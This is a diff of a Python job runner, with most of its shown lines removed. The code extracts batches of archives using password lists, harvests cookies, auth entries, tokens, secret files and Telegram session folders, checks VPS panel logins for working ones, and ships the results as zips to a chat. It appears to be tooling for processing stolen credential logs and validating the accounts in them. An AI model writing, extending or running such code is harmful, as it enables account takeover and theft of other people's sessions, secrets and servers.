-    wf = write_working(str(OUT / ("%s_working.txt" % ("vps_virtl" if virtl else "vps_promox"))),
-                       [e for (_src, e, _n) in ok], label)
-    if wf:
-        upload(wf, "✅ %s — %s working panels" % (label, len(ok)))
-    finish(task, "done", total=len(found), reach=len(ok),
-           invalid=len(inval), unreach=len(dead), sent=1 if sent else 0,
-           files=len(paths), bytes=total_bytes, mode=task.get("mode"))
-
-
-def batch_extract(task, paths, total_bytes=0):
-    """Extract every archive of the batch, then search the whole set at once."""
-    passwords = task.get("passwords") or []
-    root = WORK / "bex"
-    shutil.rmtree(root, ignore_errors=True)
-    root.mkdir(parents=True, exist_ok=True)
-
-    opened = 0
-    for i, p in enumerate(paths):
-        if stop():
-            finish(task, "cancelled")
-            return
-        st("extract", 72 + int(i * 8 / max(1, len(paths))),
-           msg="extracting %s" % os.path.basename(p),
-           files_done=i, files_total=len(paths))
-        ok, why = extract(p, root / ("%02d" % i), passwords)
-        if ok:
-            opened += 1
-        else:
-            sys.stdout.write("extract failed for %s: %s\n" % (p, why))
-            sys.stdout.flush()
-    if not opened:
-        finish(task, "error", err="no archive of the batch could be extracted")
-        return
-    if stop():
-        finish(task, "cancelled")
-        return
-
-    packed, auths = search_pack(root, bool(task.get("auth")))
-    if stop():
-        shutil.rmtree(WORK, ignore_errors=True)
-        finish(task, "cancelled")
-        return
-    sent, failed, links = deliver(packed, task)
-
-    tok_zip, tok_total = None, 0
-    toks = find_tokens([root])
-    if toks:
-        tok_zip, tok_total = pack_tokens(toks)
-    tok_parts, tok_link = 0, None
-    if tok_zip:
-        def tok_cap(size, idx, count, tot, split):
-            return (f"{gold_header('TOKEN FILES', esc('%d found' % tok_total))}\n{THIN}\n"
-                    f"🎟 {bold('Files')}    {code(tok_total)} × {code('tokens.txt')}\n"
-                    + ship_note(idx, count, size, tot, split, "tokens.zip"))
-        tok_parts, tok_link = ship(tok_zip, tok_cap)
-        if tok_link:
-            links["tokens"] = tok_link
-
-    js_zip, js_total = None, 0
-    if task.get("json"):
-        jsf = find_json([root])
-        if jsf:
-            js_zip, js_total = pack_json(jsf)
-    js_parts, js_link = 0, None
-    if js_zip:
-        def js_cap(size, idx, count, tot, split):
-            return (f"{gold_header('JSON FILES', esc('%d found' % js_total))}\n{THIN}\n"
-                    f"🗂 {bold('Files')}    {code(js_total)} × {code('.json')}\n"
-                    + ship_note(idx, count, size, tot, split, "json_files.zip"))
-        js_parts, js_link = ship(js_zip, js_cap)
-        if js_link:
-            links["json"] = js_link
-
-    sec_zip, sec_total = None, 0
-    secf = find_secrets([root])
-    if secf:
-        sec_zip, sec_total = pack_secrets(secf)
-    sec_parts, sec_link = 0, None
-    if sec_zip:
-        def sec_cap(size, idx, count, tot, split):
-            return (f"{gold_header('SECRET FILES', esc('%d found' % sec_total))}\n{THIN}\n"
-                    f"🗝 {bold('Files')}    {code(sec_total)} secret files\n"
-                    + ship_note(idx, count, size, tot, split, "secrets.zip"))
-        sec_parts, sec_link = ship(sec_zip, sec_cap)
-        if sec_link:
-            links["secrets"] = sec_link
-
-    ck = check_auths(auths) if (task.get("authcheck") and auths) else {}
-    shutil.rmtree(WORK, ignore_errors=True)
-    st("done", 100, job=task.get("job"), vm=SPECS)
-    finish(task, "done", found=packed, cookies=sum(packed.values()), sent=sent,
-           failed=failed, links=links, auth=len(auths) if task.get("auth") else 0,
-           td_total=0, td_parts=0, td_via=None,
-           tok_total=tok_total, tok_parts=tok_parts,
-           js_total=js_total, js_parts=js_parts,
-           sec_total=sec_total, sec_parts=sec_parts, files=len(paths),
-           bytes=total_bytes, mode=task.get("mode"), **ck)
-
-
-def process_batch(task):
-    """One operation over every file of the batch."""
-    global CHAT
-    mode = task.get("mode") or "vps_promox"
-    CHAT = task.get("chat")
-    PB[0], PB[2], PB[3] = 0.0, time.time(), 0
-    PB[1] = task.get("msg")
-    (OUT / "cancel.flag").unlink(missing_ok=True)
-
-    files = task.get("files") or []
-    st("queued", 0, job=task.get("job"), vm=SPECS, kind="batch", mode=mode)
-    if not files:
-        finish(task, "error", err="the batch carried no files")
-        return
-
-    paths, total_bytes, errors = batch_download(files)
-    if stop():
-        finish(task, "cancelled", err="cancelled")
-        return
-    if not paths:
-        detail = "; ".join("%s: %s" % (files[k].get("name") or k, v)
-                           for k, v in list(errors.items())[:3])
-        finish(task, "error", err="every file failed to download"
-               + (" (%s)" % detail if detail else ""))
-        return
-
-    if mode == "vps_promox":
-        batch_panels(task, paths, virtl=False, total_bytes=total_bytes)
-    elif mode == "vps_virtl":
-        batch_panels(task, paths, virtl=True, total_bytes=total_bytes)
-    elif mode == "extract":
-        batch_extract(task, paths, total_bytes=total_bytes)
-    else:
-        finish(task, "error", err="unknown batch mode %r" % mode)
-
 
 def process(task):
     """Run one job inside this long-lived VM."""
@@ -3555,8 +2165,8 @@ def process(task):
     td_parts, td_link, td_via = 0, None, None
     if td_zip:
         td_size = td_zip.stat().st_size
-        td_sub = esc('%d folder%s found' % (td_total, '' if td_total == 1 else 's'))
-        td_head = (f"{gold_header('TDATA FOUND', td_sub)}\n{THIN}\n"
+        td_head = (f"{gold_header('TDATA FOUND', esc('%d folder%s found'
+                    % (td_total, '' if td_total == 1 else 's')))}\n{THIN}\n"
                    f"🗃 {bold('Folders')}  {code(td_total)}\n"
                    f"📦 {bold('Size')}     {code(fs(td_size))}\n")
         td_tail = (f"🗂 {bold('Layout')}    plain folder trees inside the zip — "
@@ -3700,17 +2310,12 @@ def main():
     OUT.mkdir(parents=True, exist_ok=True)
     global SPECS
     SPECS = vm_specs()
-    # The task may arrive encrypted (the bot seals it with the
-    # RUNNER_TASK_KEY, the workflow opens it with the repository secret of the
-    # same name). _TASK_ is the unsealed version.
-    task = dict(_TASK_) if _TASK_ else {}
-    if task.get("url") and task.get("fallback_url"):
-        task["url"] = prefer_direct(task.get("url"), task.get("fallback_url"))
-    if task.get("kind") in ("vps_promox", "vps_check", "vps_virtl", "vps_verify"):
+    try:
+        task = json.loads(os.environ.get("TASK") or "{}")
+    except Exception:
+        task = {}
+    if task.get("kind") in ("vps_promox", "vps_check"):
         process_vps(task)
-        return
-    if task.get("kind") == "batch":
-        process_batch(task)
         return
     if not task.get("url"):
         st("error", err="runner started without a task")
